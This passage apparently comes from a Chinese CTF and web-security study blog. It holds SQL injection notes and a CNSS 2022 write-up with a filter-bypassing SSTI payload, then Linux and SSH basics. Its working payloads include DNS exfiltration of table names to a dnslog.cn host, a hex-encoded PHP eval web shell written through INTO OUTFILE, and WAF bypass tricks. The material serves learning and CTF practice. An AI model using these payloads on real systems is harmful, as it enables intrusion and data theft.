class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from sys.schema_table_statistics where table_schema = &#x27;security&#x27;;</span><br></pre></td></tr></table></figure><p>但是 <code>sys.schema_auto_increment_columns</code>这个库有些局限性，一般要<strong>超级管理员</strong>才可以访问sys。</p><blockquote><p>类似可以利用的表还有： <code>mysql.innodb_table_stats</code>、<code>mysql.innodb_table_index</code>同样存放有库名表名</p></blockquote><h6 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h6><p><a href="https://blog.csdn.net/qq_31620591/article/details/117067799#:~:text=%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8Ejoin%E7%9A%84%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%96%B9%E6%B3%95%201%20%E4%BD%BF%E7%94%A8order%20by%20%E7%8C%9C%E8%A7%A3%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0,2%20%E6%9E%84%E9%80%A0%E4%B8%8B%E8%BF%B0%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%2C%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E7%9A%84%E2%80%9C1%E2%80%9D%E9%83%A8%E5%88%86%E4%B8%BA%221%2C2%2C3%2C...%2Cn%22%20%EF%BC%8C%E7%8C%9C%E8%A7%A3%22test%22%E7%9A%84%E5%88%97%E6%95%B0%E3%80%82%20%E5%BD%93%E5%88%97%E6%95%B0%E7%8C%9C%E8%A7%A3%E6%AD%A3%E7%A1%AE%E6%97%B6%EF%BC%8C%E4%BE%BF%E6%88%90%E5%8A%9F%E6%8F%90%E5%8F%96%E4%BA%86test%E8%A1%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">参考</a></p><p>在上述方法获得表名之后，进一步获得列名</p><blockquote><p><strong>join报错得到列名</strong></p></blockquote><p> select * from (select * from users as a join users b)c;<br> ‘主要依赖于重复的列名导致的报错，它会返回：Duplicate column name”id”‘ &#x2F;&#x2F;这个时候id就报出来了<br> ​<br> 继续获得其他的<br> ​<br> select * from(select * from users as a join users b uding(id))c;   &#x2F;&#x2F;得到username<br> select * from(select * from users as a join usrers b using(id,username))c;<br> …     ‘直到没有报错，就表示获得了全部列名’</p><h6 id="sqlmap获取"><a href="#sqlmap获取" class="headerlink" title="sqlmap获取"></a>sqlmap获取</h6><p>sqlmap提供了暴力破解表名的的选项–common-tables，当出现一下场景的时候。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> DBMS（Database Management System，数据库管理系统）是 &lt; 5.0 版本的 MySQL，它们不具备 information_schema。</span><br><span class="line">DBMS 是微软的 Access 数据库，并且其中的系统表 MSysObjects 默认设置不可读。</span><br><span class="line"> 当前会话用户对 DBMS 中存储数据表定义的系统表没有读权限。</span><br></pre></td></tr></table></figure><p>就会采用字典中的表名进行暴力破解，表名储存在sqlmap路径\data\txt中</p><h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><p>上述information_schema被ban之后获得列名的办法就是无列名注入，它是基于union, join的注入手法。</p><p>一些SQL语句原理：</p><blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509172518255-1024x480.png" style="zoom:67%;" /><p>假设不知道列名，通过union查询，需猜测列数，这里为5列</p><p> select 1,2,3,4,5 union select * from table;</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20210329195833956.png" style="zoom:67%;" /><p>我们可以进一步用数字来对应列查询</p><p> select `2` from (select 1,2,3,4,5 union select * from table)a;</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20210329200819627-1024x606.png" style="zoom:67%;" /><p>如果反引号被过滤，同样继续用别名代替</p><p> select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;</p><p> select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from `table`)a;</p><p><code>0x2d</code>为<code>-</code></p></blockquote><h5 id="OOB注入"><a href="#OOB注入" class="headerlink" title="OOB注入"></a>OOB注入</h5><p>SQLi可分为三个独立的类别：<strong>inference</strong>（经典SQL注入）,<strong>inband</strong>（盲注、推理注入、带内注入）和<strong>out-of-band</strong></p><blockquote><p>out-of-band带外数据（OOB）与inband相反，它是一种通过其他传输方式来窃取数据的技术（例如利用DNS解析协议和电子邮件）。OOB技术通常需要易受攻击的实体生成出站TCP&#x2F;UDP&#x2F;ICMP请求，然后允许攻击者泄露数据。<strong>OOB攻击的成功基于出口防火墙规则</strong>，即是否允许来自易受攻击的系统和外围防火墙的出站请求。而从域名服务器（DNS）中提取数据，则被认为是最隐蔽有效的方法。</p></blockquote><p>e.g:利用dnslog.com在线网站测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.81k8pu.dnslog.cn/abc&#x27;));</span><br></pre></td></tr></table></figure><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>代码层<ul><li>黑名单：函数，关键字，敏感字符</li><li>白名单：函数，关键字，敏感字符</li><li>使用成熟的框架，用它的安全查询接口</li><li>采用预编译语句集PrepareStatement（在php中为 mysqli-&gt;prepare($sql) 函数）</li><li>转义输入：PHP函数addslashes()、mysqli_real_escape_string()</li><li>规范输出，不输出报错信息</li></ul></li><li>配置层<ul><li>开启GPC：过滤一些通用字符</li><li>使用UTF-8：防止Unicode产生宽字节注</li></ul></li><li>物理层<ul><li>WAF</li></ul></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><p><a href="https://www.cnblogs.com/Fram3/p/15865702.html">参考</a></p><ul><li>关键字过滤<ul><li>最常用的绕过方法就是用<code>/**/</code>，&lt;&gt;，分割关键字 <code>sel&lt;&gt;ect</code>或者<code>sel/**/ect</code></li><li>根据过滤程度，有时候还可以用双写绕过<code>selesselectt</code></li><li>大小写绕过，但一般可能不会成功</li><li>编码绕过：url编码，16进制绕过，ASCII编码绕过</li></ul></li><li>过滤逗号<ul><li>简单的注入可以使用<strong>join</strong>方法绕过<code>union select * from (select 1)a join (select 2)b join (select 3)c%23</code></li></ul></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509151344442-1024x747.png" style="zoom:67%;" /><p>（limit使用from或者offset）（substr使用from for属于逗号）</p><ul><li>过滤空格<ul><li>双空格</li><li>&#x2F;**&#x2F;</li><li>空格 -&gt; <strong>%a0</strong> -&gt; <strong>%0a</strong> -&gt; <strong>+</strong> -&gt; <strong>()</strong></li><li>括号绕过</li><li>回车,Tab代替 &#x2F;&#x2F;回车的ASCII码是chr(13)&amp;chr(10),url编码是%0d%0a</li></ul></li><li><strong>过滤引号</strong><ul><li>使用十六进制，把要用引号的地方用十六进制</li><li>&#x2F;&#x2F;宽字节绕过(引号转义)</li></ul></li><li>过滤等号用<code>like</code>代替</li><li>过滤大小于号主要是利用函数代替<ul><li>greatest(n1,n2,n3) &#x2F;&#x2F;返回其中的最大值</li><li>strcmp(str1,str2) &#x2F;&#x2F;str1和str2相等返回0，否则返回1或者-1(看哪个大)</li><li>in 操作符</li><li>between and &#x2F;&#x2F;选取介于这两个值之间的数据范围</li></ul></li><li>过滤 and or等 and&#x3D;&amp;&amp; or&#x3D;   xor&#x3D;   not&#x3D;!</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230409180804266-1024x187.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509143027423-1024x287.png"></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>SQL注入获得shell有两种方法，一种是写文件(outfile)，一种是<code>--os-shell</code></p><h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile()"></a>into outfile()</h5><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><ul><li>此方法利用的先决条件<ul><li>web目录具有写权限，能够使用单引号</li><li>知道网站绝对路径（根目录，或则是根目录往下的目录都行）</li><li>secure_file_priv没有具体值（在mysql&#x2F;my.ini中查看）</li></ul></li></ul><h6 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> secure_file_priv的值为null ，表示限制mysqld 不允许导入导出</span><br><span class="line">当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入导出只能发生在/tmp/目录下</span><br><span class="line"> 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入导出做限制</span><br></pre></td></tr></table></figure><p>注：修改secure_file_priv 的值只能通过手动打开配置文件进行修改，不能直接使用sql语句进行修改.</p><ul><li>查看secure_file_priv的值：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><ul><li>修改secure_file_priv的值：</li></ul><blockquote><p>在mysql&#x2F;my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 <strong>secure_file_priv &#x3D; ‘’</strong> 即可</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/22c3072fe00634a17b138868bac8beb8.png"></p></blockquote><h6 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h6><p>首先找到注入点，小马建议十六进制防止被waf杀掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile &#x27;C:\\Users\\Administrator.WIN2012\\Desktop\\phpStudy\\WWW\\outfile.php&#x27; --+</span><br></pre></td></tr></table></figure><p>注：这里网站的目录要使用<strong>双斜杠</strong>不然会写不进去，第一个斜杠是转义的意思，字符串解析不仅仅局限于C编译器，Java编译器、一些配置文件的解析、Web服务器等等，都会遇到对字符串进行解析的这个问题，由于传统的 Windows采用的是单个斜杠的路径分隔形式，导致在对文件路径进行解析的时候可能发生不必要的错误，所以就出现了用双反斜杠<code>\\</code>分隔路径的形式。 不管解析引擎是否将反斜杠解析成转义字符，最终在内存中得到的都是<code>\</code>，结果也就不会出问题了。</p><blockquote><p>也可以用into dumpfile()</p></blockquote><p><strong>into dumpfile() 与 into outfile()区别</strong></p><ul><li>outfile函数可以导出多行，而dumpfile只能导出一行数据</li><li>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</li><li>umpfile适用于二进制文件，它会将目标文件吸入同一行内；outfile则更适用于文本文件。</li></ul><h5 id="os-shell-sqlmap"><a href="#os-shell-sqlmap" class="headerlink" title="--os-shell(sqlmap)"></a>--os-shell(sqlmap)</h5><h6 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h6><p>--os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件</p><h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul><li>要求为数据库DBA，使用–is-dba查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba</li><li>secure_file_priv没有具体值</li><li>知道网站的绝对路径</li></ul><h6 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509193030676-1024x210.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/513e42f930d1c33a6ddf76a9cd950a8c-1024x315.png"></p><h6 id="sql-shell"><a href="#sql-shell" class="headerlink" title="--sql-shell"></a>--sql-shell</h6><p>这个可以直接先使用这个来执行一些sql语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> sqlmap.py -u &quot;xxx&quot; --sql-shell</span><br><span class="line">&gt;&gt;&gt;select @@datadir;    &#x27;查看文件路径（mysql/data的路径，根目录一般与mysql处于同一目录）&#x27;</span><br><span class="line">&gt;&gt;&gt;select @@secure_file_priv    &#x27;查看secure_file_priv的值是否为空&#x27;     返回null就不行，啥也不返回才行</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS 2022 招新writeup(web)部分题目</title>
      <link href="/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/05/14/cnss-2022-%E6%8B%9B%E6%96%B0writeupweb%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Hard-Walk-Through-My-Intranet-1"><a href="#Hard-Walk-Through-My-Intranet-1" class="headerlink" title="[Hard] Walk Through My Intranet - 1"></a>[Hard] Walk Through My Intranet - 1</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> pattern = re.compile(r&#x27;os\[]_self\+-\*class&quot;\.&#x27;, re.I  re.M)</span><br></pre></td></tr></table></figure><p>题目给的url过滤信息，分为几类bypass</p><p>os ，class ，self ，__ 可以进行编码绕过 <strong>class</strong>=&#x3D;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> \x+ASCII值 =》对应值（只要数据被引号包裹，就能作为字符串一样被处理，base64,ascii，字符串凭借，倒置等）</span><br></pre></td></tr></table></figure><p>[ ] 和 . 是进行进入目录子类的，用 attr(‘ ‘) 一次性都过滤掉</p><p>其他的都用不上，原始payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> &#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__()[&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;](300).__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>把’ ‘里的敏感东西用ASCII编码过滤掉。[ ]就用attr换掉</p><p>最后一个双引号里面套单引号就可以改成外面单引号里面双引号，然后里面又是被当做字符串的那种，就可以ASCII编码了。</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> &#123;&#123;&#x27;&#x27;attr(&#x27;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fmro\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(1)attr(&#x27;\x5f\x5fsub\x63\x6c\x61\x73\x73es\x5f\x5f&#x27;)()attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(300)attr(&#x27;\x5f\x5finit\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;)attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;eval&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f(\x22\x6F\x73\x22)\x2epopen(\x22ls\x22)\x2eread()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ls的地方就是能够输入命令有漏洞的地方。</p><h3 id="linux敏感目录"><a href="#linux敏感目录" class="headerlink" title="linux敏感目录"></a>linux敏感目录</h3><p>进入linux目录之后开始寻找敏感目录：</p><p>这些又是基于<strong>FHS</strong>（Filesystem Hierarchy Standard ）机构</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1-1024x719.png" style="zoom:50%;" /><p><strong>FHS认为根目录(&#x2F;)下应该包含如下子目录</strong></p><p>目录</p><p>应放置档案内容</p><p>&#x2F;bin</p><p>系统有很多放置执行档的目录，但&#x2F;bin比较特殊。因为&#x2F;bin放置的是在单人维护模式下还能够被操作的<strong>指令</strong>。在&#x2F;bin底下的指令可以被<strong>root与一般帐号所使用</strong>，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。</p><p>&#x2F;boot</p><p>主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在&#x2F;boot&#x2F;grub&#x2F;这个目录。</p><p>&#x2F;dev</p><p>（device）在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp_, &#x2F; dev&#x2F;hd_, &#x2F;dev&#x2F;sd*等等</p><p>&#x2F;etc</p><p>系统主要的<strong>设定档</strong>几乎都放置在这个目录内，例如<strong>人员的帐号密码档、各种服务的启始档</strong>等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;等等。 另外，其下重要的目录有：&#x2F;etc&#x2F;init.d&#x2F; ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： &#x2F;etc&#x2F;init.d&#x2F;iptables start、&#x2F;etc&#x2F;init.d&#x2F; iptables stop &#x2F;etc&#x2F;xinetd.d&#x2F; ：这就是所谓的super daemon管理的各项服务的设定档目录。 &#x2F;etc&#x2F;X11&#x2F; ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。（配置信息）</p><p>&#x2F;home</p><p>这是系统预设的使用者家目录(home directory)。 在你<strong>新增一个一般使用者帐号时，预设的使用者家目录都会规范</strong>到这里来。比较重要的是，家目录有两种代号： <strong>~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录。</strong></p><p>&#x2F;lib</p><p>系统的函式库非常的多，而&#x2F;lib放置的则是在<strong>开机时会用到的函式库</strong>，以及在&#x2F;bin或&#x2F;sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是&#x2F;lib&#x2F;modules&#x2F;这个目录，因为该目录会放置核心相关的模组(驱动程式)。</p><p>&#x2F;media</p><p>media是媒体的英文，顾名思义，这个&#x2F;media底下放置的就是<strong>可移除的装置</strong>。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdrom等等。</p><p>&#x2F;mnt</p><p>如果妳想要<strong>暂时挂载某些额外的装置</strong>，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与&#x2F;media相同啦。 只是有了&#x2F;media之后，这个目录就用来暂时挂载用了。</p><p>&#x2F;opt</p><p>这个是给<strong>第三方协力软体</strong>放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在&#x2F;usr&#x2F;local目录下。</p><p>&#x2F;root</p><p>系统管理员(<strong>root)的家目录</strong>。 之所以放在这里，是因为<strong>如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录</strong>，所以我们会希望root的家目录与根目录放置在同一个分区中。</p><p>&#x2F;sbin</p><p>Linux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在&#x2F;sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到&#x2F;usr&#x2F;sbin&#x2F;当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</p><p>&#x2F;srv</p><p>srv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的<strong>资料目录</strong>。 常见的服务例如WWW, FTP等等。 举例来说，<strong>WWW伺服器需要的网页资料就可以放置在&#x2F;srv&#x2F;www&#x2F;里面。呵呵，看来平时我们编写的代码应该放到这里了。</strong></p><p>&#x2F;tmp</p><p>这是让一般使用者或者是正在执行的程序<strong>暂时放置档案</strong>的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将&#x2F;tmp下的资料都删除。</p><p>还有下面这些</p><p>&#x2F;lost+found</p><p>这个目录是使用标准的ext2&#x2F;ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于&#x2F;disk中，那在这个系统下就会自动产生一个这样的目录&#x2F;disk&#x2F;lost+found</p><p>&#x2F;proc</p><p>这个目录本身是一个<strong>虚拟文件系统</strong>(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*等等。呵呵，是虚拟内存吗[guest]？</p><p>&#x2F;sys</p><p>这个目录其实跟&#x2F;proc非常类似，也是一个<strong>虚拟的档案系统</strong>，主要也是记录与<strong>核心相关的资讯</strong>。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。</p><p>推荐博客</p><p><a href="https://www.cnblogs.com/silence-hust/p/4319415.html">https://www.cnblogs.com/silence-hust/p/4319415.html</a></p><h3 id="linux常见命令"><a href="#linux常见命令" class="headerlink" title="linux常见命令"></a>linux常见命令</h3><h5 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> whoami</span><br></pre></td></tr></table></figure><h5 id="查看ip等信息"><a href="#查看ip等信息" class="headerlink" title="查看ip等信息"></a>查看ip等信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ifcinfig        //查询和配置网络接口</span><br><span class="line"> hostname -I  // 显示主机名ip</span><br><span class="line"> ip addr show  //查看ipv4，ipv6地址</span><br></pre></td></tr></table></figure><h5 id="显示当前位置路径"><a href="#显示当前位置路径" class="headerlink" title="显示当前位置路径"></a>显示当前位置路径</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   pwd                         //显示当前位置路径</span><br></pre></td></tr></table></figure><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> find . -name &quot;*.c&quot;     //将目前目录及其子目录下所有延伸档名是 c 的文件列出来</span><br><span class="line"> find . -type f         //将目前目录其其下子目录中所有一般文件列出</span><br><span class="line"> find . -ctime -20      //将目前目录及其子目录下所有最近 20 天内更新过的文件列出</span><br><span class="line"> find /var/log -type f -mtime +7 -ok rm &#123;&#125; \;     //查找/var/log目录中更改时间在7日以前的普通文件，并在删除之前询问它们</span><br><span class="line"> find . -type f -perm 644 -exec ls -l &#123;&#125; \;       //查找前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件</span><br><span class="line"> find / -type f -size 0 -exec ls -l &#123;&#125; \;         //为了查找系统中所有文件长度为0的普通文件，并列出它们的完整路径</span><br></pre></td></tr></table></figure><h5 id="系统信息（-）"><a href="#系统信息（-）" class="headerlink" title="系统信息（*）"></a>系统信息（*）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> uname -a    //可以显示一些重要的系统信息，例如内核名称、主机名、内核版本号、处理器类型之类的信息</span><br><span class="line"> ps -ef         //查看所有正在运行的进程</span><br><span class="line"> ps -aux     //显示所有用户打开的进程,包括无控制终端的进程   其中有其他用户的command</span><br><span class="line"> ping IP        //查看与此IP地址的连接情况</span><br><span class="line"> netstat -an    //查看当前系统端口</span><br><span class="line"> netstat -an  grep 8080     //查看指定端口</span><br></pre></td></tr></table></figure><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。</span><br></pre></td></tr></table></figure><p>从客户端来看，SSH提供两种级别的<strong>安全验证</strong>。</p><p><strong>用于远程登录主机</strong></p><p><strong>第一种级别（基于口令的安全验证）</strong></p><p>只要你知道自己帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的[服务器]。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。</p><p><strong>第二种级别（基于密匙的安全验证）</strong></p><p><strong>非对称加密</strong></p><p>需要依靠<strong>密匙</strong>，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。</p><p>用这种方式，你必须知道自己密匙的<a href="https://baike.baidu.com/item/%E5%8F%A3%E4%BB%A4?fromModule=lemma_inlink">口令</a>。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。</p><p>第二种级别不仅加密所有传送的数据，而且“中间人”这种攻击方式也是不可能的（因为他没有你的私人密匙）。但是整个登录的过程可能需要10秒 。</p><h4 id="公钥登录"><a href="#公钥登录" class="headerlink" title="公钥登录"></a>公钥登录</h4><p>1.服务器生成公私钥对（有些服务器开机自起）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # cd</span><br><span class="line"> # ssh-keygen</span><br></pre></td></tr></table></figure><p>2.将公钥导入authorized_keys文件,并将私钥保存到本地计算机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # cat id_rsa.pub &gt;&gt;authorized_keys</span><br><span class="line"> # cat authorized_keys</span><br></pre></td></tr></table></figure><p>id_rsa, id_rua.pub, authorized_keys 都在 ~&#x2F;.ssh目录下（ssh是用户目录下的<strong>隐藏文件</strong>）</p><p>3.修改ssh配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> # vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>4.重启sshd服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> // centos系统</span><br><span class="line"> # systemctl restart sshd.service</span><br><span class="line"> // ubuntu系统</span><br><span class="line"> # /etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><h6 id="5-远程登录"><a href="#5-远程登录" class="headerlink" 